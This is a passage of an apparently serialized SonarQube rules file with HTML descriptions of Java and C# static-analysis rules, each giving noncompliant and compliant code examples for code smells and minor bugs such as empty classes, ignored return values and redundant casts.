public boolean equals(Object obj) {
  if (obj == null)
    return false;

  if (this.getClass() != obj.getClass())
    return false;

  MyClass mc = (MyClass)obj;
  // ...
}
</pre>ZBUG
é

java:S2094ˇ
javaS2094Classes should not be empty"MINOR*java:π<p>There is no good excuse for an empty class. If it's being used simply as a common extension point, it should be replaced with an
<code>interface</code>. If it was stubbed in as a placeholder for future development it should be fleshed-out. In any other case, it should be
eliminated.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Nothing {  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface Nothing {
}
</pre>
<h2>Exceptions</h2>
<p>Empty classes can be used as marker types (for Spring for instance), therefore empty classes that are annotated will be ignored.</p>
<pre>
@Configuration
@EnableWebMvc
public final class ApplicationConfiguration {

}
</pre>Z
CODE_SMELL
ı
	java:S899Á
javaS899OReturn values should not be ignored when they contain the operation status code"MINOR*java:Î<p>When the return value of a function call contain the operation status code, this value should be tested to make sure the operation completed
successfully.</p>
<p>This rule raises an issue when the return values of the following are ignored:</p>
<ul>
  <li> <code>java.io.File</code> operations that return a status code (except <code>mkdirs</code>) </li>
  <li> <code>Iterator.hasNext()</code> </li>
  <li> <code>Enumeration.hasMoreElements()</code> </li>
  <li> <code>Lock.tryLock()</code> </li>
  <li> non-void <code>Condition.await*</code> methods </li>
  <li> <code>CountDownLatch.await(long, TimeUnit)</code> </li>
  <li> <code>Semaphore.tryAcquire</code> </li>
  <li> <code>BlockingQueue</code>: <code>offer</code>, <code>remove</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(File file, Lock lock) {
  file.delete();  // Noncompliant
  // ...
  lock.tryLock(); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(File file, Lock lock) {
  if (!lock.tryLock()) {
    // lock failed; take appropriate action
  }
  if (!file.delete()) {
    // file delete failed; take appropriate action
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/w4C4Ag">CERT, ERR33-C.</a> - Detect and handle standard library errors </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/iIBfBw">CERT, POS54-C.</a> - Detect and handle POSIX library errors </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9gEqAQ">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9YIRAQ">CERT, EXP12-C.</a> - Do not ignore values returned by functions </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/toHWAw">CERT, FIO02-J.</a> - Detect and handle file-related errors </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/754">MITRE, CWE-754</a> - Improper Check for Unusual Exceptional Conditions </li>
</ul>ZVULNERABILITY
Ÿ
csharpsquid:S2344√
csharpsquidS2344AEnumeration type names should not have "Flags" or "Enum" suffixes"MINOR*cs:“<p>The information that an enumeration type is actually an enumeration or a set of flags should not be duplicated in its name.</p>
<h2>Noncompliant Code Example</h2>
<pre>
enum FooFlags // Noncompliant
{
    Foo = 1
    Bar = 2
    Baz = 4
}
</pre>
<h2>Compliant Solution</h2>
<pre>
enum Foo
{
    Foo = 1
    Bar = 2
    Baz = 4
}
</pre>Z
CODE_SMELL
ı
csharpsquid:S2345ﬂ
csharpsquidS2345AFlags enumerations should explicitly initialize all their members"MINOR*cs:ı
<p>Flags enumerations should not rely on the language to initialize the values of their members. Implicit initialization will set the first member to
0, and increment the value by one for each subsequent member. This implicit behavior does not allow members to be combined using the bitwise or
operator in a useful way.</p>
<p>Instead, 0 and powers of two (i.e. 1, 2, 4, 8, 16, ...) should be used to explicitly initialize all the members.</p>
<h2>Noncompliant Code Example</h2>
<pre>
[Flags]
enum FruitType    // Noncompliant
{
  None,
  Banana,
  Orange,
  Strawberry
}
class Program
{
    static void Main()
    {
        var bananaAndStrawberry = FruitType.Banana | FruitType.Strawberry;
        // Will display only Strawberry!
        Console.WriteLine(bananaAndStrawberry.ToString());
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
[Flags]
enum FruitType
{
  None = 0,
  Banana = 1,
  Orange = 2,
  Strawberry = 4
}
class Program
{
    static void Main()
    {
        var bananaAndStrawberry = FruitType.Banana | FruitType.Strawberry;
        // Will display Banana and Strawberry, as expected.
        Console.WriteLine(bananaAndStrawberry.ToString());
    }
}
</pre>
<h2>Exceptions</h2>
<p>The default initialization of 0, 1, 2, 3, 4, ... matches 0, 1, 2, 4, 8 ... in the first three values, so no issue is reported if the first three
members of the enumeration is not initialized.</p>ZBUG
‹
csharpsquid:S2221∆
csharpsquidS2221D"Exception" should not be caught when not required by called methods"MINOR*cs:“
<p>Catching <code>System.Exception</code> seems like an efficient way to handle multiple possible exceptions. Unfortunately, it traps all exception
types, including the ones that were not intended to be caught. To prevent any misunderstandings, the exception filters should be used. Alternatively
each exception type should be in a separate <code>catch</code> block.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try
{
  // do something that might throw a FileNotFoundException or IOException
}
catch (Exception e) // Noncompliant
{
  // log exception ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try
{
  // do something
}
catch (Exception e) when (e is FileNotFoundException || e is IOException)
{
  // do something
}

</pre>
<h2>Exceptions</h2>
<p>The final option is to catch <code>System.Exception</code> and <code>throw</code> it in the last statement in the <code>catch</code> block. This is
the least-preferred option, as it is an old-style code, which also suffers from performance penalty compared to exception filters.</p>
<pre>
try
{
  // do something
}
catch (Exception e)
{
  if (e is FileNotFoundException || e is IOException)
  {
    // do something
  }
  else
  {
    throw;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/396.html">MITRE, CWE-396</a> - Declaration of Catch for Generic Exception </li>
</ul>Z
CODE_SMELL
ø

csharpsquid:S2342©

csharpsquidS23428Enumeration types should comply with a naming convention"MINOR*cs:¡	<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all <code>enum</code> names match a provided regular
expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Pascal casing, starting with an upper case character, e.g. BackColor </li>
  <li> Short abbreviations of 2 letters can be capitalized, e.g. GetID </li>
  <li> Longer abbreviations need to be lower case, e.g. GetHtml </li>
  <li> If the enum is marked as [Flags] then its name should be plural (e.g. MyOptions), otherwise, names should be singular (e.g. MyOption) </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression for non-flags enums: <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code></p>
<pre>
public enum foo // Noncompliant
{
    FooValue = 0
}
</pre>
<p>With the default regular expression for flags enums: <code>^([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?s$</code></p>
<pre>
[Flags]
public enum Option // Noncompliant
{
    None = 0,
    Option1 = 1,
    Option2 = 2
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public enum Foo
{
    FooValue = 0
}
</pre>
<pre>
[Flags]
public enum Options
{
    None = 0,
    Option1 = 1,
    Option2 = 2
}
</pre>Z
CODE_SMELL
≠
csharpsquid:S2228ó
csharpsquidS2228"Console logging should not be used"MINOR*cs:¬<p>Debug statements are always useful during development. But include them in production code - particularly in code that runs client-side - and you
run the risk of inadvertently exposing sensitive information.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private void DoSomething()
{
    // ...
    Console.WriteLine("so far, so good..."); // Noncompliant
    // ...
}
</pre>
<h2>Exceptions</h2>
<p>The following are ignored by this rule:</p>
<ul>
  <li> Console Applications </li>
  <li> Calls in methods decorated with <code>[Conditional ("DEBUG")]</code> </li>
  <li> Calls included in DEBUG preprocessor branches (<code>#if DEBUG</code>) </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
</ul>ZVULNERABILITY
ª
csharpsquid:S1940•
csharpsquidS1940%Boolean checks should not be inverted"MINOR*cs:–<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ( !(a == 2)) { ...}  // Noncompliant
bool b = !(i &lt; 10);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a != 2) { ...}
bool b = (i &gt;= 10);
</pre>Z
CODE_SMELL
·
csharpsquid:S3444À
csharpsquidS3444PInterfaces should not simply inherit from base interfaces with colliding members"MINOR*cs:À<p>When an interface inherits from two interfaces that both define a member with the same name, trying to access that member through the derived
interface will result in the compiler error <code>CS0229 Ambiguity between 'IBase1.SomeProperty' and 'IBase2.SomeProperty'</code>.</p>
<p>So instead, every caller will be forced to cast instances of the derived interface to one or the other of its base interfaces to resolve the
ambiguity and be able to access the member. Instead, it is better to resolve the ambiguity in the definition of the derived interface either by:</p>
<ul>
  <li> renaming the member in one of the base interfaces to remove the collision </li>
  <li> also defining that member in the derived interface. Use this only if all copies of the member are meant to hold the same value. </li>
</ul>
<p> </p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface IBase1
{
  string SomeProperty { get; set; }
}

public interface IBase2
{
  string SomeProperty { get; set; }
}

public interface IDerived : IBase1, IBase2 // Noncompliant, accessing IDerived.SomeProperty is ambiguous
{
}

public class MyClass : IDerived
{
  // Implements both IBase1.SomeProperty and IBase2.SomeProperty
  public string SomeProperty { get; set; } = "Hello";

  public static void Main()
  {
    MyClass myClass = new MyClass();
    Console.WriteLine(myClass.SomeProperty); // Writes "Hello" as expected
    Console.WriteLine(((IBase1)myClass).SomeProperty); // Writes "Hello" as expected
    Console.WriteLine(((IBase2)myClass).SomeProperty); // Writes "Hello" as expected
    Console.WriteLine(((IDerived)myClass).SomeProperty); // Error CS0229 Ambiguity between 'IBase1.SomeProperty' and 'IBase2.SomeProperty'
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface IDerived : IBase1, IBase2
{
  new string SomeProperty { get; set; }
}

public class MyClass : IDerived
{
  // Implements IBase1.SomeProperty, IBase2.SomeProperty and IDerived.SomeProperty
  public string SomeProperty { get; set; } = "Hello";

  public static void Main()
  {
    MyClass myClass = new MyClass();
    Console.WriteLine(myClass.SomeProperty); // Writes "Hello" as expected
    Console.WriteLine(((IBase1)myClass).SomeProperty); // Writes "Hello" as expected
    Console.WriteLine(((IBase2)myClass).SomeProperty); // Writes "Hello" as expected
    Console.WriteLine(((IDerived)myClass).SomeProperty); // Writes "Hello" as expected
  }
}
</pre>
<p>or</p>
<pre>
public interface IBase1
{
  string SomePropertyOne { get; set; }
}

public interface IBase2
{
  string SomePropertyTwo { get; set; }
}

public interface IDerived : IBase1, IBase2
{
}
</pre>Z
CODE_SMELL
È
csharpsquid:S1264”
csharpsquidS12645A "while" loop should be used instead of a "for" loop"MINOR*cs:Ó<p>When only the condition expression is defined in a <code>for</code> loop, and the initialization and increment expressions are missing, a
<code>while</code> loop should be used instead to increase readability. </p>
<h2>Noncompliant Code Example</h2>
<pre>
for (;condition;) { /*...*/ }
</pre>
<h2>Compliant Solution</h2>
<pre>
while (condition) { /*...*/ }
</pre>Z
CODE_SMELL
Ã
csharpsquid:S3440∂
csharpsquidS3440OVariables should not be checked against the values they're about to be assigned"MINOR*cs:∑<p>There's no point in checking a variable against the value you're about to assign it. Save the cycles and lines of code, and simply perform the
assignment.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x != a)  // Noncompliant; why bother?
{
    x = a;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
x = a;
</pre>
<h2>Exceptions</h2>
<p>Properties and checks inside setters are excluded from this rule because they could have side effects and removing the check could lead to
undesired side effects.</p>
<pre>
if (MyProperty != a)
{
    MyProperty = a; // Compliant because the setter could be expensive call
}
</pre>
<pre>
private int myField;
public int SomeProperty
{
    get
    {
        return myField;
    }
    set
    {
        if (myField != value)
        {
            myField = value;
        }
    }
}
</pre>Z
CODE_SMELL
‰
csharpsquid:S3441Œ
csharpsquidS3441?Redundant property names should be omitted in anonymous classes"MINOR*cs:ﬂ<p>When an anonymous type's properties are copied from properties or variables with the same names, it yields cleaner code to omit the new type's
property name and the assignment operator.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var X = 5;

var anon = new
{
  X = X, //Noncompliant, the new object would have the same property without the "X =" part.
  Y = "my string"
};
</pre>
<h2>Compliant Solution</h2>
<pre>
var X = 5;

var anon = new
{
  X,
  Y = "my string"
};
</pre>Z
CODE_SMELL
ƒ
csharpsquid:S1939Æ
csharpsquidS1939(Inheritance list should not be redundant"MINOR*cs:÷<p>An inheritance list entry is redundant if:</p>
<ul>
  <li> It is <code>Object</code> - all classes extend <code>Object</code> implicitly. </li>
  <li> It is <code>int</code> for an <code>enum</code> </li>
  <li> It is a base class of another listed inheritance. </li>
</ul>
<p>Such redundant declarations should be removed because they needlessly clutter the code and can be confusing.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass : Object  // Noncompliant

enum MyEnum : int  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass

enum MyEnum
</pre>Z
CODE_SMELL
„
csharpsquid:S3897Õ
csharpsquidS3897CClasses that provide "Equals(<T>)" should implement "IEquatable<T>""MINOR*cs:⁄<p>The <code>IEquatable&lt;T&gt;</code> interface has only one method in it: <code>Equals(&lt;T&gt;)</code>. If you've already written
<code>Equals(T)</code>, there's no reason not to explicitly implement <code>IEquatable&lt;T&gt;</code>. Doing so expands the utility of your class by
allowing it to be used where an <code>IEquatable</code> is called for.</p>
<p><strong></strong>Note**: Classes that implement <code>IEquatable&lt;T&gt;</code> should also be <code>sealed</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass  // Noncompliant
{
  public bool Equals(MyClass other)
  {
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
sealed class MyClass : IEquatable&lt;MyClass&gt;
{
  public override bool Equals(object other)
  {
    return Equals(other as MyClass);
  }

  public bool Equals(MyClass other)
  {
    //...
  }
}
</pre>Z
CODE_SMELL
é
csharpsquid:S2325¯
csharpsquidS2325GMethods and properties that don't access instance data should be static"MINOR*cs:Å<p>Methods and properties that don't access instance data can be <code>static</code> to prevent any misunderstanding about the contract of the method.
</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Utilities
{
    public int MagicNum // Noncompliant
    {
        get
        {
            return 42;
        }
    }

    private static string magicWord = "please";
    public string MagicWord  // Noncompliant
    {
        get
        {
            return magicWord;
        }
        set
        {
            magicWord = value;
        }
  }

    public int Sum(int a, int b)  // Noncompliant
    {
        return a + b;
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Utilities
{
    public static int MagicNum
    {
        get
        {
            return 42;
        }
    }

    private static string magicWord = "please";
    public static string MagicWord
    {
        get
        {
            return magicWord;
        }
        set
        {
            magicWord = value;
        }
    }

    public static int Sum(int a, int b)
    {
        return a + b;
    }
}
</pre>
<h2>Exceptions</h2>
<p>Methods with the following names are excluded because they can't be made <code>static</code>:</p>
<ul>
  <li> Application_AuthenticateRequest </li>
  <li> Application_BeginRequest </li>
  <li> Application_End </li>
  <li> Application_EndRequest </li>
  <li> Application_Error </li>
  <li> Application_Init </li>
  <li> Application_Start </li>
  <li> Session_End </li>
  <li> Session_Start </li>
</ul>Z
CODE_SMELL
√
csharpsquid:S3532≠
csharpsquidS3532)Empty "default" clauses should be removed"MINOR*cs:‘<p>The <code>default</code> clause should take appropriate action. Having an empty <code>default</code> is a waste of keystrokes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
enum Fruit
{
  Apple,
  Orange,
  Banana
}

void PrintName(Fruit fruit)
{
  switch(fruit)
  {
    case Fruit.Apple:
      Console.WriteLine("apple");
      break;
    default:  //Noncompliant
      break;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
enum Fruit
{
  Apple,
  Orange,
  Banana
}

void PrintName(Fruit fruit)
{
  switch(fruit)
  {
    case Fruit.Apple:
      Console.WriteLine("apple");
      break;
    default:
      throw new NotSupportedException();
  }
}
</pre>
<p>or</p>
<pre>
void PrintName(Fruit fruit)
{
  switch(fruit)
  {
    case Fruit.Apple:
      Console.WriteLine("apple");
      break;
  }
}
</pre>
<h2>Exceptions</h2>
<p><code>default</code> clauses containing only a comment are ignored with the assumption that they are empty on purpose and the comment documents
why.</p>Z
CODE_SMELL
˘
csharpsquid:S4069„
csharpsquidS40691Operator overloads should have named alternatives"MINOR*cs:Ç<p>Operator overloading is convenient but unfortunately not portable across languages. To be able to access the same functionality from another
language you need to provide an alternate named method following the convention:</p>
<table>
  <tbody>
    <tr>
      <th>Operator</th>
      <th>Method Name</th>
    </tr>
    <tr>
      <th><code>+</code> (binary)</th>
      <th>Add</th>
    </tr>
    <tr>
      <th><code>&amp;</code></th>
      <th>BitwiseAnd</th>
    </tr>
    <tr>
      <th><code>|</code></th>
      <th>BitwiseOr</th>
    </tr>
    <tr>
      <th><code>/</code></th>
      <th>Divide</th>
    </tr>
    <tr>
      <th><code>==</code></th>
      <th>Equals</th>
    </tr>
    <tr>
      <th><code>^</code></th>
      <th>Xor</th>
    </tr>
    <tr>
      <th><code>&gt;</code></th>
      <th>Compare</th>
    </tr>
    <tr>
      <th><code>&gt;=</code></th>
      <th>Compare</th>
    </tr>
    <tr>
      <th><code>!=</code></th>
      <th>Equals</th>
    </tr>
    <tr>
      <th><code>&lt;</code></th>
      <th>Compare</th>
    </tr>
    <tr>
      <th><code>&lt;=</code></th>
      <th>Compare</th>
    </tr>
    <tr>
      <th><code>!</code></th>
      <th>LogicalNot</th>
    </tr>
    <tr>
      <th><code>%</code></th>
      <th>Mod</th>
    </tr>
    <tr>
      <th><code>*</code> (binary)</th>
      <th>Multiply</th>
    </tr>
    <tr>
      <th><code>~</code></th>
      <th>OnesComplement</th>
    </tr>
    <tr>
      <th><code>-</code> (binary)</th>
      <th>Subtract</th>
    </tr>
    <tr>
      <th><code>-</code> (unary)</th>
      <th>Negate</th>
    </tr>
    <tr>
      <th><code>+</code> (unary)</th>
      <th>Plus</th>
    </tr>
  </tbody>
</table>
<p>This rule raises an issue when there is an operator overload without the expected named alternative method.</p>
<h2>Exceptions</h2>
<p>This rule does not raise an issue when the class implementing the comparison operators <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code> and
<code>&lt;=</code> contains a method named <code>CompareTo</code>.</p>Z
CODE_SMELL
£
csharpsquid:S2328ç
csharpsquidS23281"GetHashCode" should not reference mutable fields"MINOR*cs:≥<p><code>GetHashCode</code> is used to file an object in a <code>Dictionary</code> or <code>Hashtable</code>. If <code>GetHashCode</code> uses
non-<code>readonly</code> fields and those fields change after the object is stored, the object immediately becomes mis-filed in the
<code>Hashtable</code>. Any subsequent test to see if the object is in the <code>Hashtable</code> will return a false negative.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Person
{
  public int age;
  public string name;

  public override int GetHashCode()
  {
    int hash = 12;
    hash += this.age.GetHashCode(); // Noncompliant
    hash += this.name.GetHashCode(); // Noncompliant
    return hash;
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Person
{
  public readonly DateTime birthday;
  public string name;

  public override int GetHashCode()
  {
    int hash = 12;
    hash += this.birthday.GetHashCode();
    return hash;
  }
</pre>ZBUG
◊
csharpsquid:S1116¡
csharpsquidS1116"Empty statements should be removed"MINOR*cs:Ô<p>Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:</p>
<ul>
  <li> It was meant to be replaced by an actual statement, but this was forgotten. </li>
  <li> There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void DoSomething()
{
    ; // Noncompliant - was used as a kind of TODO marker
}

void DoSomethingElse()
{
    Console.WriteLine("Hello, world!");;  // Noncompliant - double ;
    // ...
    // Rarely, they are used on purpose as the body of a loop. It is a bad practice to
    // have side-effects outside of the loop:
    for (int i = 0; i &lt; 3; Console.WriteLine(i), i++); // Noncompliant
    // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void DoSomething()
{
}

void DoSomethingElse()
{
    Console.WriteLine("Hello, world!");
    // ...
    for (int i = 0; i &lt; 3; i++)
    {
        Console.WriteLine(i);
     }
    // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7gCTAw">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for,
  or while condition </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/i4FtAg">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for,
  or while statement </li>
</ul>Z
CODE_SMELL
û
csharpsquid:S1905à
csharpsquidS1905"Redundant casts should not be used"MINOR*cs:∂<p>Unnecessary casting expressions make the code harder to read and understand.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int Example(int i)
{
    return (int) (i + 42); // Noncompliant
}

public IEnumerable&lt;int&gt; ExampleCollection(IEnumerable&lt;int&gt; coll)
{
    return coll.Reverse().OfType&lt;int&gt;(); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int Example(int i)
{
    return i + 42;
}

public IEnumerable&lt;int&gt; ExampleCollection(IEnumerable&lt;int&gt; coll)
{
    return coll.Reverse();
}
</pre>
<h2>Exceptions</h2>
<p>Issues are not raised against C# 7.1 `default` literal.</p>
<pre>
bool b = (bool)default; // Doesn't raise an issue
</pre>Z
CODE_SMELL
ÿ
csharpsquid:S4061¬
csharpsquidS4061,"params" should be used instead of "varargs""MINOR*cs:Ê<p>A method using the <code>VarArgs</code> calling convention is not Common Language Specification (CLS) compliant and might not be accessible across
programming languages, while the <code>params</code> keyword works the same way and is CLS compliant.</p>
<p>This rule raises an issue when a <code>public</code> or <code>protected</code> type contains a <code>public</code> or <code>protected</code> method
that uses the <code>VarArgs</code> calling convention.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
    public class Foo
    {
        public void Bar(__arglist) // Noncompliant
        {
            ArgIterator argumentIterator = new ArgIterator(__arglist);
            for(int i = 0; i &lt; argumentIterator.GetRemainingCount(); i++)
            {
                Console.WriteLine(
                    __refvalue(argumentIterator.GetNextArg(), string));
            }
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

[assembly: CLSCompliant(true)]
namespace MyLibrary
{
    public class Foo
    {
        public void Bar(params string[] wordList)
        {
            for(int i = 0; i &lt; wordList.Length; i++)
            {
                Console.WriteLine(wordList[i]);
            }
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>Interop methods using <code>VarArgs</code> calling convention do not raise an issue.</p>
<pre>
[DllImport("msvcrt40.dll")]
public static extern int printf(string format, __arglist); // Compliant
</pre>Z
CODE_SMELL
›

csharpsquid:S4060«

csharpsquidS4060(Non-abstract attributes should be sealed"MINOR*cs:Ô	<p>The .NET framework class library provides methods for retrieving custom attributes. Sealing the attribute eliminates the search through the
inheritance hierarchy, and can improve performance.</p>
<p>This rule raises an issue when a public type inherits from <code>System.Attribute</code>, is not abstract, and is not sealed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
    [AttributeUsage(AttributeTargets.Class|AttributeTargets.Struct)]
    public class MyAttribute: Attribute // Noncompliant
    {
        private string nameValue;
        public MyAttribute(string name)
        {
            nameValue = name;
        }

        public string Name
        {
            get
            {
                return nameValue;
            }
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
    [AttributeUsage(AttributeTargets.Class|AttributeTargets.Struct)]
    public sealed class MyAttribute: Attribute
    {
        private string nameValue;
        public MyAttribute(string name)
        {
            nameValue = name;
        }

        public string Name
        {
            get
            {
                return nameValue;
            }
        }
    }
}
</pre>Z
CODE_SMELL
ï	
csharpsquid:S1125ˇ
csharpsquidS1125(Boolean literals should not be redundant"MINOR*cs:ß<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (booleanMethod() == true) { /* ... */ }
if (booleanMethod() == false) { /* ... */ }
if (booleanMethod() || false) { /* ... */ }
doSomething(!false);
doSomething(booleanMethod() == true);

booleanVariable = booleanMethod() ? true : false;
booleanVariable = booleanMethod() ? true : exp;
booleanVariable = booleanMethod() ? false : exp;
booleanVariable = booleanMethod() ? exp : true;
booleanVariable = booleanMethod() ? exp : false;

for (var x = 0; true; x++)
{
 ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (booleanMethod()) { /* ... */ }
if (!booleanMethod()) { /* ... */ }
if (booleanMethod()) { /* ... */ }
doSomething(true);
doSomething(booleanMethod());

booleanVariable = booleanMethod();
booleanVariable = booleanMethod() || exp;
booleanVariable = !booleanMethod() &amp;&amp; exp;
booleanVariable = !booleanMethod() || exp;
booleanVariable = booleanMethod() &amp;&amp; exp;

for (var x = 0; ; x++)
{
 ...
}
</pre>Z
CODE_SMELL
–
csharpsquid:S2333∫
csharpsquidS2333&Redundant modifiers should not be used"MINOR*cs:‰<p>Unnecessary keywords simply clutter the code and should be removed. Specifically:</p>
<ul>
  <li> <code>partial</code> on type declarations that are completely defined in one place </li>
  <li> <code>sealed</code> on members of <code>sealed</code> classes </li>
  <li> <code>unsafe</code> method or block inside construct already marked with <code>unsafe</code>, or when there are no <code>unsafe</code>
  constructs in the block </li>
  <li> <code>checked</code> and <code>unchecked</code> blocks with no integral-type arithmetic operations </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public partial class MyClass // Noncompliant
{
  public virtual void Method()
  {
  }
}

public sealed class MyOtherClass : MyClass
{
  public sealed override void Method() // Noncompliant
  {
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass
{
  public virtual void Method()
  {
  }
}

public sealed class MyOtherClass : MyClass
{
  public override void Method()
  {
  }
}
</pre>Z
CODE_SMELL
â
csharpsquid:S2219Û
csharpsquidS2219*Runtime type checking should be simplified"MINOR*cs:ô<p>To check the type of an object there are several options:</p>
<ul>
  <li> <code>expr is SomeType</code> or <code>expr.GetType() == typeof(SomeType)</code> if the type is known at compile time, </li>
  <li> <code>typeInstance.IsInstanceOfType(expr)</code> if the type is calculated during runtime. </li>
</ul>
<p>If runtime calculated <code>Type</code>s need to be compared:</p>
<ul>
  <li> <code>typeInstance1.IsAssignableFrom(typeInstance2)</code>. </li>
</ul>
<p>Depending on whether the type is returned by a <code>GetType()</code> or <code>typeof()</code> call, the <code>IsAssignableFrom()</code> and
<code>IsInstanceOfType()</code> might be simplified. Similarly, if the type is <code>sealed</code>, the type comparison with <code>==</code> can be
converted to an <code>is</code> call. Simplifying the calls also make <code>null</code> checking unnecessary because both <code>is</code> and
<code>IsInstanceOfType</code> performs it already.</p>
<p>Finally, utilizing the most concise language constructs for type checking makes the code more readable, so</p>
<ul>
  <li> <code>expr as T != null</code> checks should be simplified to <code>expr is T</code>, and </li>
  <li> <code>expr is T</code> should be converted to <code>expr != null</code>, when <code>expr</code> is of type <code>T</code>. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
class Fruit { }
sealed class Apple : Fruit { }

class Program
{
  static void Main()
  {
    var apple = new Apple();
    var b = apple != null &amp;&amp; apple.GetType() == typeof (Apple); // Noncompliant
    b = typeof(Apple).IsInstanceOfType(apple); // Noncompliant
    if (apple != null)
    {
      b = typeof(Apple).IsAssignableFrom(apple.GetType()); // Noncompliant
    }
    var appleType = typeof (Apple);
    if (apple != null)
    {
      b = appleType.IsAssignableFrom(apple.GetType()); // Noncompliant
    }

    Fruit f = apple;
    if (f as Apple != null) // Noncompliant
    {
    }
    if (apple is Apple) // Noncompliant
    {
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Fruit { }
sealed class Apple : Fruit { }

class Program
{
  static void Main()
  {
    var apple = new Apple();
    var b = apple is Apple;
    b = apple is Apple;
    b = apple is Apple;
    var appleType = typeof(Apple);
    b = appleType.IsInstanceOfType(apple);

    Fruit f = apple;
    if (f is Apple)
    {
    }
    if (apple != null)
    {
    }
  }
}
</pre>
<h2>Exceptions</h2>
<p>Calling <code>GetType</code> on an object of <code>Nullable&lt;T&gt;</code> type returns the underlying generic type parameter <code>T</code>, thus
a comparison with <code>typeof(Nullable&lt;T&gt;)</code> can't be simplified to use the <code>is</code> operator, which doesn't make difference
between <code>T</code> and <code>T?</code>.</p>
<pre>
int? i = 42;
bool condition = i.GetType() == typeof(int?); // false;
condition = i is int?; // true
</pre>
<p>No issue is reported on the following expressions:</p>
<ul>
  <li> <code>expr is T</code>&nbsp;when either operand of the <code>is</code> operator is a value type. In that case CS0183 or CS0184 reports </li>
  <li> <code>expr is object</code>, as this is a common and efficient pattern to do null checks </li>
</ul>Z
CODE_SMELL
≤
csharpsquid:S1128ú
csharpsquidS1128 Unused "using" should be removed"MINOR*cs:Ã<p>Although unnecessary <code>using</code> won't change anything to the produced application, removing them:</p>
<ul>
  <li> Will help readability and maintenance. </li>
  <li> Will help reduce the number of items in the IDE auto-completion list when coding. </li>
  <li> May avoid some name collisions. </li>
  <li> May improve compilation time because the compiler has fewer namespaces to look-up when it resolves types. </li>
  <li> The build will fail if this namespace is removed from the project. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
using System.Collections.Generic; // Noncompliant - unnecessary using

namespace Foo
{
    public class Bar
    {
        public Bar(string path)
        {
            File.ReadAllLines(path);
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System.IO;

namespace Foo
{
    public class Bar
    {
        public Bar(string path)
        {
            File.ReadAllLines(path);
        }
    }
}
</pre>Z
CODE_SMELL
˛
csharpsquid:S1481Ë
